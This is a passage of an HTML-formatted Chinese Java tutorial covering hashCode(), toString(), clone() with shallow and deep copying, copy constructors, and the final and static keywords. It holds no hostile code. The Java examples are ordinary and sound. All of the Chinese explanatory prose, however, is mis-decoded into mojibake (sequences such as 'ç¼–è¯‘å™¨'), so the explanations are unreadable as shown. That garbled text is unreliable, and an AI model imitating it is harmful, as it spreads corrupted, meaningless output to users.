(x&lt;&lt;5)-x</code>ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è¿›è¡Œè¿™ä¸ªä¼˜åŒ–ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"nd\">@Override</span>\n<span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">hashCode</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"kt\">int</span> <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">17</span><span class=\"o\">;</span>\n    <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">31</span> <span class=\"o\">*</span> <span class=\"n\">result</span> <span class=\"o\">+</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n    <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">31</span> <span class=\"o\">*</span> <span class=\"n\">result</span> <span class=\"o\">+</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n    <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"n\">31</span> <span class=\"o\">*</span> <span class=\"n\">result</span> <span class=\"o\">+</span> <span class=\"n\">z</span><span class=\"o\">;</span>\n    <span class=\"k\">return</span> <span class=\"n\">result</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>toString()</h2><p>é»˜è®¤è¿”å› ToStringExample@4554617c è¿™ç§å½¢å¼ï¼Œå…¶ä¸­ @ åé¢çš„æ•°å€¼ä¸ºæ•£åˆ—ç çš„æ— ç¬¦å·åå…­è¿›åˆ¶è¡¨ç¤ºã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">ToStringExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">number</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">ToStringExample</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">number</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">number</span> <span class=\"o\">=</span> <span class=\"n\">number</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">ToStringExample</span> <span class=\"n\">example</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ToStringExample</span><span class=\"o\">(</span><span class=\"n\">123</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">example</span><span class=\"o\">.</span><span class=\"na\">toString</span><span class=\"o\">());</span>\n<span class=\"n\">ToStringExample</span><span class=\"nd\">@4554617c</span></code></pre></div><h2>clone()</h2><p><b>1. cloneable</b> </p><p>clone() æ˜¯ Object çš„ protected æ–¹æ³•ï¼Œå®ƒä¸æ˜¯ publicï¼Œä¸€ä¸ªç±»ä¸æ˜¾å¼å»é‡å†™ clone()ï¼Œå…¶å®ƒç±»å°±ä¸èƒ½ç›´æ¥å»è°ƒç”¨è¯¥ç±»å®ä¾‹çš„ clone() æ–¹æ³•ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">CloneExample</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">a</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">b</span><span class=\"o\">;</span>\n<span class=\"o\">}</span>\n<span class=\"n\">CloneExample</span> <span class=\"n\">e1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">CloneExample</span><span class=\"o\">();</span>\n<span class=\"o\">//</span> <span class=\"n\">CloneExample</span> <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span> <span class=\"o\">//</span> <span class=\"err\">&#39;</span><span class=\"n\">clone</span><span class=\"o\">()</span><span class=\"err\">&#39;</span> <span class=\"n\">has</span> <span class=\"kd\">protected</span> <span class=\"n\">access</span> <span class=\"n\">in</span> <span class=\"err\">&#39;</span><span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">Object</span><span class=\"err\">&#39;</span></code></pre></div><p>é‡å†™ clone() å¾—åˆ°ä»¥ä¸‹å®ç°ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">CloneExample</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">a</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">b</span><span class=\"o\">;</span>\n\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">public</span> <span class=\"n\">CloneExample</span> <span class=\"nf\">clone</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">CloneNotSupportedException</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"n\">CloneExample</span><span class=\"o\">)</span><span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">CloneExample</span> <span class=\"n\">e1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">CloneExample</span><span class=\"o\">();</span>\n<span class=\"k\">try</span> <span class=\"o\">{</span>\n    <span class=\"n\">CloneExample</span> <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span>\n<span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">CloneNotSupportedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n<span class=\"o\">}</span>\n<span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">CloneNotSupportedException</span><span class=\"o\">:</span> <span class=\"n\">CloneExample</span></code></pre></div><p>ä»¥ä¸ŠæŠ›å‡ºäº† CloneNotSupportedExceptionï¼Œè¿™æ˜¯å› ä¸º CloneExample æ²¡æœ‰å®ç° Cloneable æ¥å£ã€‚</p><p>åº”è¯¥æ³¨æ„çš„æ˜¯ï¼Œclone() æ–¹æ³•å¹¶ä¸æ˜¯ Cloneable æ¥å£çš„æ–¹æ³•ï¼Œè€Œæ˜¯ Object çš„ä¸€ä¸ª protected æ–¹æ³•ã€‚Cloneable æ¥å£åªæ˜¯è§„å®šï¼Œå¦‚æœä¸€ä¸ªç±»æ²¡æœ‰å®ç° Cloneable æ¥å£åˆè°ƒç”¨äº† clone() æ–¹æ³•ï¼Œå°±ä¼šæŠ›å‡º CloneNotSupportedExceptionã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">CloneExample</span> <span class=\"kd\">implements</span> <span class=\"n\">Cloneable</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">a</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">b</span><span class=\"o\">;</span>\n\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">public</span> <span class=\"n\">Object</span> <span class=\"nf\">clone</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">CloneNotSupportedException</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p><b>2. æµ…æ‹·è´</b> </p><p>æ‹·è´å¯¹è±¡å’ŒåŸå§‹å¯¹è±¡çš„å¼•ç”¨ç±»å‹å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">ShallowCloneExample</span> <span class=\"kd\">implements</span> <span class=\"n\">Cloneable</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">arr</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">ShallowCloneExample</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">arr</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">10</span><span class=\"o\">];</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">arr</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">i</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">set</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">value</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">value</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">get</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">];</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">protected</span> <span class=\"n\">ShallowCloneExample</span> <span class=\"nf\">clone</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">CloneNotSupportedException</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"n\">ShallowCloneExample</span><span class=\"o\">)</span> <span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">ShallowCloneExample</span> <span class=\"n\">e1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ShallowCloneExample</span><span class=\"o\">();</span>\n<span class=\"n\">ShallowCloneExample</span> <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n<span class=\"k\">try</span> <span class=\"o\">{</span>\n    <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span>\n<span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">CloneNotSupportedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n<span class=\"o\">}</span>\n<span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">set</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"n\">222</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">e2</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">));</span> <span class=\"o\">//</span> <span class=\"n\">222</span></code></pre></div><p><b>3. æ·±æ‹·è´</b> </p><p>æ‹·è´å¯¹è±¡å’ŒåŸå§‹å¯¹è±¡çš„å¼•ç”¨ç±»å‹å¼•ç”¨ä¸åŒå¯¹è±¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">DeepCloneExample</span> <span class=\"kd\">implements</span> <span class=\"n\">Cloneable</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">arr</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">DeepCloneExample</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">arr</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">10</span><span class=\"o\">];</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">arr</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">i</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">set</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">value</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">value</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">get</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">];</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">protected</span> <span class=\"n\">DeepCloneExample</span> <span class=\"nf\">clone</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">CloneNotSupportedException</span> <span class=\"o\">{</span>\n        <span class=\"n\">DeepCloneExample</span> <span class=\"n\">result</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">DeepCloneExample</span><span class=\"o\">)</span> <span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span>\n        <span class=\"n\">result</span><span class=\"o\">.</span><span class=\"na\">arr</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">arr</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">];</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">arr</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">result</span><span class=\"o\">.</span><span class=\"na\">arr</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">];</span>\n        <span class=\"o\">}</span>\n        <span class=\"k\">return</span> <span class=\"n\">result</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">DeepCloneExample</span> <span class=\"n\">e1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">DeepCloneExample</span><span class=\"o\">();</span>\n<span class=\"n\">DeepCloneExample</span> <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n<span class=\"k\">try</span> <span class=\"o\">{</span>\n    <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">clone</span><span class=\"o\">();</span>\n<span class=\"o\">}</span> <span class=\"k\">catch</span> <span class=\"o\">(</span><span class=\"n\">CloneNotSupportedException</span> <span class=\"n\">e</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">printStackTrace</span><span class=\"o\">();</span>\n<span class=\"o\">}</span>\n<span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">set</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"n\">222</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">e2</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">));</span> <span class=\"o\">//</span> <span class=\"n\">2</span></code></pre></div><p><b>4. clone() çš„æ›¿ä»£æ–¹æ¡ˆ</b> </p><p>ä½¿ç”¨ clone() æ–¹æ³•æ¥æ‹·è´ä¸€ä¸ªå¯¹è±¡å³å¤æ‚åˆæœ‰é£é™©ï¼Œå®ƒä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå¹¶ä¸”è¿˜éœ€è¦ç±»å‹è½¬æ¢ã€‚Effective Java ä¹¦ä¸Šè®²åˆ°ï¼Œæœ€å¥½ä¸è¦å»ä½¿ç”¨ clone()ï¼Œå¯ä»¥ä½¿ç”¨æ‹·è´æ„é€ å‡½æ•°æˆ–è€…æ‹·è´å·¥å‚æ¥æ‹·è´ä¸€ä¸ªå¯¹è±¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">CloneConstructorExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">arr</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">CloneConstructorExample</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">arr</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">10</span><span class=\"o\">];</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">arr</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">i</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">CloneConstructorExample</span><span class=\"o\">(</span><span class=\"n\">CloneConstructorExample</span> <span class=\"n\">original</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">arr</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"kt\">int</span><span class=\"o\">[</span><span class=\"n\">original</span><span class=\"o\">.</span><span class=\"na\">arr</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">];</span>\n        <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">original</span><span class=\"o\">.</span><span class=\"na\">arr</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n            <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">original</span><span class=\"o\">.</span><span class=\"na\">arr</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">];</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">set</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">value</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">]</span> <span class=\"o\">=</span> <span class=\"n\">value</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">get</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">index</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">arr</span><span class=\"o\">[</span><span class=\"n\">index</span><span class=\"o\">];</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">CloneConstructorExample</span> <span class=\"n\">e1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">CloneConstructorExample</span><span class=\"o\">();</span>\n<span class=\"n\">CloneConstructorExample</span> <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">CloneConstructorExample</span><span class=\"o\">(</span><span class=\"n\">e1</span><span class=\"o\">);</span>\n<span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">set</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"n\">222</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">e2</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">));</span> <span class=\"o\">//</span> <span class=\"n\">2</span></code></pre></div><h2>å…­ã€å…³é”®å­—</h2><h2>final</h2><p><b>1. æ•°æ®</b> </p><p>å£°æ˜æ•°æ®ä¸ºå¸¸é‡ï¼Œå¯ä»¥æ˜¯ç¼–è¯‘æ—¶å¸¸é‡ï¼Œä¹Ÿå¯ä»¥æ˜¯åœ¨è¿è¡Œæ—¶è¢«åˆå§‹åŒ–åä¸èƒ½è¢«æ”¹å˜çš„å¸¸é‡ã€‚</p><ul><li>å¯¹äºåŸºæœ¬ç±»å‹ï¼Œfinal ä½¿æ•°å€¼ä¸å˜ï¼›</li><li>å¯¹äºå¼•ç”¨ç±»å‹ï¼Œfinal ä½¿å¼•ç”¨ä¸å˜ï¼Œä¹Ÿå°±ä¸èƒ½å¼•ç”¨å…¶å®ƒå¯¹è±¡ï¼Œä½†æ˜¯è¢«å¼•ç”¨çš„å¯¹è±¡æœ¬èº«æ˜¯å¯ä»¥ä¿®æ”¹çš„ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span>\n<span class=\"c1\">// x = 2;  // cannot assign value to final variable &#39;x&#39;\n</span><span class=\"c1\"></span><span class=\"kd\">final</span> <span class=\"n\">A</span> <span class=\"n\">y</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">A</span><span class=\"o\">();</span>\n<span class=\"n\">y</span><span class=\"o\">.</span><span class=\"na\">a</span> <span class=\"o\">=</span> <span class=\"n\">1</span><span class=\"o\">;</span></code></pre></div><p><b>2. æ–¹æ³•</b> </p><p>å£°æ˜æ–¹æ³•ä¸èƒ½è¢«å­ç±»é‡å†™ã€‚</p><p>private æ–¹æ³•éšå¼åœ°è¢«æŒ‡å®šä¸º finalï¼Œå¦‚æœåœ¨å­ç±»ä¸­å®šä¹‰çš„æ–¹æ³•å’ŒåŸºç±»ä¸­çš„ä¸€ä¸ª private æ–¹æ³•ç­¾åç›¸åŒï¼Œæ­¤æ—¶å­ç±»çš„æ–¹æ³•ä¸æ˜¯é‡å†™åŸºç±»æ–¹æ³•ï¼Œè€Œæ˜¯åœ¨å­ç±»ä¸­å®šä¹‰äº†ä¸€ä¸ªæ–°çš„æ–¹æ³•ã€‚</p><p><b>3. ç±»</b> </p><p>å£°æ˜ç±»ä¸å…è®¸è¢«ç»§æ‰¿ã€‚</p><h2>static</h2><p><b>1. é™æ€å˜é‡</b> </p><ul><li>é™æ€å˜é‡ï¼šåˆç§°ä¸ºç±»å˜é‡ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªå˜é‡å±äºç±»çš„ï¼Œç±»æ‰€æœ‰çš„å®ä¾‹éƒ½å…±äº«é™æ€å˜é‡ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡ç±»åæ¥è®¿é—®å®ƒã€‚é™æ€å˜é‡åœ¨å†…å­˜ä¸­åªå­˜åœ¨ä¸€ä»½ã€‚</li><li>å®ä¾‹å˜é‡ï¼šæ¯åˆ›å»ºä¸€ä¸ªå®ä¾‹å°±ä¼šäº§ç”Ÿä¸€ä¸ªå®ä¾‹å˜é‡ï¼Œå®ƒä¸è¯¥å®ä¾‹åŒç”Ÿå…±æ­»ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">A</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">;</span>         <span class=\"c1\">// å®ä¾‹å˜é‡\n</span><span class=\"c1\"></span>    <span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"o\">;</span>  <span class=\"c1\">// é™æ€å˜é‡\n</span><span class=\"c1\"></span>\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"c1\">// int x = A.x;  // Non-static field &#39;x&#39; cannot be referenced from a static context\n</span><span class=\"c1\"></span>        <span class=\"n\">A</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">A</span><span class=\"o\">();</span>\n        <span class=\"kt\">int</span> <span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"n\">a</span><span class=\"o\">.</span><span class=\"na\">x</span><span class=\"o\">;</span>\n        <span class=\"kt\">int</span> <span class=\"n\">y</span> <span class=\"o\">=</span> <span class=\"n\">A</span><span class=\"o\">.</span><span class=\"na\">y</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p><b>2. é™æ€æ–¹æ³•</b> </p><p>é™æ€æ–¹æ³•åœ¨ç±»åŠ è½½çš„æ—¶å€™å°±å­˜åœ¨äº†ï¼Œå®ƒä¸ä¾èµ–äºä»»ä½•å®ä¾‹ã€‚æ‰€ä»¥é™æ€æ–¹æ³•å¿…é¡»æœ‰å®ç°ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä¸èƒ½æ˜¯æŠ½è±¡æ–¹æ³•ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">abstract</span> <span class=\"kd\">class</span> <span class=\"nc\">A</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">func1</span><span class=\"o\">(){</span>\n    <span class=\"o\">}</span>\n    <span class=\"c1\">// public abstract static void func2();  // Illegal combination of modifiers: &#39;abstract&#39; and &#39;static&#39;\n</span><span class=\"c1\"></span><span class=\"o\">}</span></code></pre></div><p>åªèƒ½è®¿é—®æ‰€å±ç±»çš„é™æ€å­—æ®µå’Œé™æ€æ–¹æ³•ï¼Œæ–¹æ³•ä¸­ä¸èƒ½æœ‰ this å’Œ super å…³é”®å­—ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> 